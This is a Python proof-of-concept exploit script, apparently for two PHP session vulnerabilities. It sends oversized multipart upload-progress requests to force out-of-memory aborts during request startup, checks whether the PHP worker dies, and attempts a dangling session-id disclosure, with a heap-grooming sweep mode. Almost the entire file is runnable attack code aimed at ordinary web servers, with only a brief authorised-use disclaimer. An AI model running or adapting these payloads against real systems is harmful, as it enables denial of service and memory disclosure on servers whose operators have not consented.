#!/usr/bin/env python3
"""
php2shell (CVE-2026-109618 / CVE-2026-109619) probe for PHP 8.4.24.

What this actually tests
------------------------
The bug is NOT a session-file poisoning trick. It is state corruption when an
OOM longjmp escapes a half-initialized operation during *request startup*, in
the pre-RINIT session.upload_progress callback:

  ext/session/session.c:3187  php_session_initialize();
  ext/session/session.c:3188  PS(session_status) = php_session_active;   <- forced
  ext/session/session.c:445   zend_string_release_ex(PS(id), 0);         <- freed
  ext/session/session.c:446   PS(id) = s_create_sid(...);                <- if this OOMs,
                                                                             PS(id) dangles
Fixed in 8.4.27 (commit 3584a98b): delayed OOM/UnwindExit, PS(id)=NULL after
release, session init failures checked, and php_rinit_session_globals() at
MULTIPART_EVENT_START.

Modes
-----
  recon      fingerprint PHP and session behaviour
  oom        verified: OOM inside the pre-RINIT upload-progress callback,
             report worker survival and response shape
  stale-sid  request A tries to leave PS(id) dangling (strict mode + OOM),
             request B probes the same worker and inspects Set-Cookie for a
             malformed / oversized session id (the memory-disclosure symptom)
  sweep      lab only: vary the filler so the *small* SID allocation (not the
             huge progress key) is the allocation that fails

Honesty note: `oom` reproduces reliably. `stale-sid` and `sweep` implement the
documented disclosure primitive (Imperva "stale session-id pointer", Wiz
"PS(id) points to the freed allocation"). Landing it needs the SID allocation
inside s_create_sid() to fail, which requires heap/chunk grooming; a random
memory_limit is not enough. The script reports what it observed, never more.

Use only against systems you are authorised to test.
"""
import argparse
import http.client
import re
import sys
import time
from urllib.parse import urlparse

BOUNDARY = "----php2shell"
SID_RE = re.compile(r"^(?P<sid>[0-9a-v]{26,256})$")
VULNERABLE = ("8.0.", "8.1.", "8.2.", "8.3.", "8.4.")
PATCHED = {"8.2": "35", "8.3": "36", "8.4": "27", "8.5": "12"}


def api(host, port, path, body=None, headers=None, timeout=20, method=None):
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request(method or ("POST" if body is not None else "GET"),
                     path, body=body, headers=headers or {})
        r = conn.getresponse()
        data = r.read()
        return r.status, r.getheaders(), data.decode("latin-1", "replace")
    finally:
        conn.close()


def cookie_sid(headers):
    for k, v in headers:
        if k.lower() == "set-cookie" and v.upper().startswith("PHPSESSID="):
            return v.split("=", 1)[1].split(";")[0]
    return None


def multipart(progress_value=b"x", file_parts=1, filler=None, filename="a.txt"):
    """filler: list of (name, bytes) form fields parsed *before* the file part."""
    out = [f"--{BOUNDARY}\r\n"
           f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'.encode()
           + progress_value + b"\r\n"]
    for name, value in (filler or []):
        out.append(f"--{BOUNDARY}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n"
                   .encode() + value + b"\r\n")
    for i in range(file_parts):
        out.append(f"--{BOUNDARY}\r\n"
                   f'Content-Disposition: form-data; name="f{i}"; filename="{filename}"\r\n\r\n'
                   .encode() + b"Z" * 64 + b"\r\n")
    out.append(f"--{BOUNDARY}--\r\n".encode())
    return b"".join(out)


def send(host, port, path, body, sid=None, timeout=30):
    headers = {"Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
               "Content-Length": str(len(body))}
    if sid:
        headers["Cookie"] = f"PHPSESSID={sid}"
    return api(host, port, path, body=body, headers=headers, timeout=timeout)


def alive(host, port, path):
    try:
        api(host, port, path, timeout=5)
        return True          # any HTTP status (even 404) means the worker is up
    except Exception:
        return False


def fmt(raw, n=160):
    return raw.replace("\r", "\\r").replace("\n", "\\n")[:n]


def cmd_recon(a):
    st, hdrs, body = api(a.host, a.port, a.path)
    powered = next((v for k, v in hdrs if k.lower() == "x-powered-by"), "")
    print(f"[+] {a.target}{a.path} -> {st}, {powered or 'no X-Powered-By'}")
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", powered)
    if m:
        ver = m.group(1)
        branch = ".".join(ver.split(".")[:2])
        fixed = PATCHED.get(branch)
        if fixed and int(ver.split(".")[2]) < int(fixed):
            print(f"[!] PHP {ver} is in the affected range (fixed in {branch}.{fixed})")
        else:
            print(f"[*] PHP {ver} is not in the affected range")
    print(f"[*] session cookie issued: {cookie_sid(hdrs)}")
    return 0


def cmd_oom(a):
    key = b"A" * a.key_bytes
    body = multipart(progress_value=key, file_parts=1)
    t0 = time.time()
    st, hdrs, text = send(a.host, a.port, a.path, body, sid=a.sid, timeout=a.timeout)
    oom_text = "Allowed memory size" in text
    sid_cookie = cookie_sid(hdrs)
    # The abort happens before the script runs, so there is no body and no cookie.
    aborted = (not text.strip()) and not sid_cookie
    print(f"[*] POST {len(body)} bytes, progress key {a.key_bytes} bytes")
    print(f"[*] HTTP {st} in {time.time()-t0:.2f}s, body={len(text)}B, "
          f"Set-Cookie={sid_cookie}")
    if oom_text:
        line = next((l for l in text.splitlines() if "Allowed memory" in l), "")
        print(f"[+] {line.strip()[:180]}")
        if "Request Startup" in line or "Unknown on line 0" in line:
            print("[+] OOM raised with no script frame -> pre-RINIT callback path")
    elif aborted:
        print("[+] request aborted before any application code ran "
              "(empty response, no session cookie) -> pre-RINIT callback path")
    else:
        print("[*] no abort: the target absorbed the body "
              "(memory_limit / post_max_size above key-bytes)")
    time.sleep(a.settle)
    ok = alive(a.host, a.port, a.path)
    print(f"[*] worker still serving: {ok}")
    if not ok:
        print("[+] worker died after the OOM (state-corruption / abort path)")
    return 0


def cmd_stale_sid(a):
    bad = a.sid or ("a" * 32)
    # Request A: strict-mode branch -> PS(id) released, then s_create_sid().
    body_a = multipart(progress_value=b"A" * a.key_bytes, file_parts=1,
                       filler=a_filler(a))
    try:
        st_a, hdrs_a, text_a = send(a.host, a.port, a.path, body_a, sid=bad, timeout=a.timeout)
    except Exception as exc:
        print(f"[-] request A failed: {exc}")
        return 1
    aborted_a = (not text_a.strip()) and not cookie_sid(hdrs_a)
    print(f"[*] A: HTTP {st_a}, body={len(text_a)}B, cookie={cookie_sid(hdrs_a)}, "
          f"aborted={aborted_a}")
    if not aborted_a:
        print("[i] A completed normally: PS(id) was reassigned, so nothing is stale.")
    # If A did not abort, PS(id) was replaced normally and there is nothing stale.
    time.sleep(a.settle)
    if not alive(a.host, a.port, a.path):
        print("[+] A killed the worker; no second request can observe stale PS(id).")
        return 0
    # Request B: probe the same worker through the upload-progress callback.
    body_b = multipart(progress_value=b"x", file_parts=1, filename="b.txt")
    try:
        st_b, hdrs_b, text_b = send(a.host, a.port, a.path, body_b, sid=bad, timeout=a.timeout)
    except Exception as exc:
        print(f"[!] B failed ({exc}) - worker gone or connection reset")
        return 0
    sid_b = cookie_sid(hdrs_b)
    print(f"[*] B: HTTP {st_b}, cookie={sid_b!r} (len={len(sid_b) if sid_b else 0})")
    if sid_b and not SID_RE.match(sid_b):
        print(f"[+] MALFORMED SESSION ID - possible stale-pointer disclosure: {sid_b!r}")
        return 0
    if sid_b and len(sid_b) > 256:
        print("[+] OVERSIZED SESSION ID - disclosure symptom")
        return 0
    print("[-] no disclosure observed at this memory limit / heap layout")
    print("[i] The SID allocation must be the allocation that fails; needs chunk")
    print("[i] grooming (see --mode sweep in a lab with a settable memory_limit).")
    return 2


def a_filler(a):
    if a.filler_fields <= 0 or a.filler_bytes <= 0:
        return None
    each = max(1, a.filler_bytes // a.filler_fields)
    return [(f"z{i}", b"F" * each) for i in range(a.filler_fields)]


def cmd_sweep(a):
    """Lab-only: total body size is the knob; memory_limit is fixed by the target."""
    results = []
    step = max(64 * 1024, a.filler_bytes // 40) if a.filler_bytes else 256 * 1024
    total = a.filler_bytes or (14 * 1024 * 1024)
    size = step
    while size <= total:
        fields = max(1, min(a.filler_fields, size // (256 * 1024)))
        each = size // fields
        filler = [(f"z{i}", b"F" * each) for i in range(fields)]
        body = multipart(progress_value=b"A" * a.key_bytes, file_parts=1, filler=filler)
        try:
            st, hdrs, text = send(a.host, a.port, a.path, body, sid=a.sid, timeout=a.timeout)
        except Exception as exc:
            print(f"  filler={size//1024:>6}K exception: {exc}")
            size += step
            continue
        sid = cookie_sid(hdrs)
        oom = "Allowed memory size" in text
        aborted = (not text.strip()) and not sid
        bad = bool(sid and not SID_RE.match(sid))
        print(f"  filler={size//1024:>6}K body={len(body)//1024:>6}K "
              f"oom={oom!s:<5} aborted={aborted!s:<5} "
              f"cookie={sid} {'<== MALFORMED' if bad else ''}")
        results.append((size, oom, sid, bad))
        size += step
    malformed = [r for r in results if r[3]]
    print(f"[*] {len(results)} attempts, {len(malformed)} malformed session ids")
    return 0 if malformed else 2


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--target", default="http://127.0.0.1:18090")
    p.add_argument("--path", default="/index.php", help="endpoint that parses multipart POSTs")
    p.add_argument("--mode", choices=("recon", "oom", "stale-sid", "sweep"), default="recon")
    p.add_argument("--sid", default=None, help="session id to send (strict-mode probe)")
    p.add_argument("--key-bytes", type=int, default=4 * 1024 * 1024,
                   help="size of the PHP_SESSION_UPLOAD_PROGRESS value (huge alloc)")
    p.add_argument("--filler-fields", type=int, default=8,
                   help="form fields parsed before the file part (max_input_vars caps this)")
    p.add_argument("--filler-bytes", type=int, default=12 * 1024 * 1024)
    p.add_argument("--timeout", type=int, default=60)
    p.add_argument("--settle", type=float, default=0.3)
    a = p.parse_args()

    u = urlparse(a.target)
    a.host, a.port = u.hostname, u.port or 80
    if u.path and u.path != "/" and (not a.path or a.path == "/index.php"):
        a.path = u.path     # honour a path given in --target
    a.path = a.path or "/index.php"
    if not a.path.startswith("/"):
        a.path = "/" + a.path
    if not a.sid:
        # upload-progress only runs when a session id is known up front
        import random
        a.sid = "".join(random.choice("0123456789abcdef") for _ in range(32))

    print(f"[*] php2shell probe -> {a.target}{a.path}")
    print(f"[*] mode={a.mode}")
    return {"recon": cmd_recon, "oom": cmd_oom,
            "stale-sid": cmd_stale_sid, "sweep": cmd_sweep}[a.mode](a)


if __name__ == "__main__":
    sys.exit(main())
